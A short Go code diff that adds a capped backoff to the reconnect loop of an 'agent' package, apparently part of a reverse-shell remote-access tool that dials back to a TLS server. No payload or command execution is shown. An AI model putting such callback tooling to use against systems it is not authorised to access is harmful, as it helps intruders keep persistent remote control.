@@ -2,6 +2,7 @@ package agent
 
 import (
 	"crypto/tls"
+	"math"
 	"net"
 	"reverse_shell/pkg/crypto_tls"
 	"time"
@@ -24,12 +25,16 @@ func DialTLSServer(addr string, caFile, serverName string) (net.Conn, error) {
 }
 
 func ConnectLoop(addr string, caFile, serverName string, logger *zap.Logger) (net.Conn, error) {
+	attempt := 0
 	for {
 		conn, err := DialTLSServer(addr, caFile, serverName)
 		if err == nil {
 			return conn, nil
 		}
 		logger.Error("Failed to connect to %s: %v", zap.String("address", addr), zap.Error(err))
-		time.Sleep(time.Second * 3)
+		backoff := time.Duration(math.Min(float64(attempt), 5)) * time.Second
+		logger.Info("Retrying in %s...", zap.Duration("backoff", backoff))
+		time.Sleep(backoff)
+		attempt++
 	}
 }
